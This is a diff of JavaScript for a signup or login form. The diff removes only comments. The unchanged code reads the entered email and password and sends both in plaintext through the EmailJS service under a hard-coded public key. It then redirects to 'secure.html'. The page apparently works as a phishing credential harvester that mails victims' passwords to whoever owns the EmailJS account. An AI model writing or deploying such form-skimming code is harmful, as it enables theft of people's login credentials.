@@ -103,17 +103,13 @@ emailjs.init({
   publicKey: 'OdVrpD_0CpgUT6Ahz'
 });
 
-/* ======================================
-   ÉLÉMENTS DU FORMULAIRE
-====================================== */
+
 const form = document.getElementById('signupForm');
 const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('pwd');
 const result = document.getElementById('result');
 
-/* ======================================
-   LIMITES DES CHAMPS
-====================================== */
+
 if (emailInput) {
   emailInput.addEventListener('input', function () {
     this.value = this.value.slice(0, 50);
@@ -126,18 +122,13 @@ if (passwordInput) {
   });
 }
 
-// ======================================
-// SUBMIT
-// ======================================
+
 
 if (form && emailInput && passwordInput && result) {
   form.addEventListener("submit", async function (event) {
     event.preventDefault();
 
 
-    // ------------------------------
-    // Vérification HTML
-    // ------------------------------
 
     if (!form.checkValidity()) {
         form.reportValidity();
@@ -146,26 +137,19 @@ if (form && emailInput && passwordInput && result) {
 
    
 
-    // ------------------------------
-    // Récupération des données
-    // ------------------------------
+    
 
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
 
 
-    // ------------------------------
-    // Paramètres EmailJS
-    // ------------------------------
-
+   
     const templateParams = {
         email: email,
         password: password,
       
    } 
-    // ------------------------------
-    // Envoi EmailJS
-    // ------------------------------
+    
 
     result.textContent = "Connetion en cours...";
     result.className = "";
@@ -191,10 +175,6 @@ if (form && emailInput && passwordInput && result) {
         result.className = "success";
 
 
-
-        // ------------------------------
-        // Redirection après envoi réussi
-        // ------------------------------
 
         window.location.href = "secure.html";
         
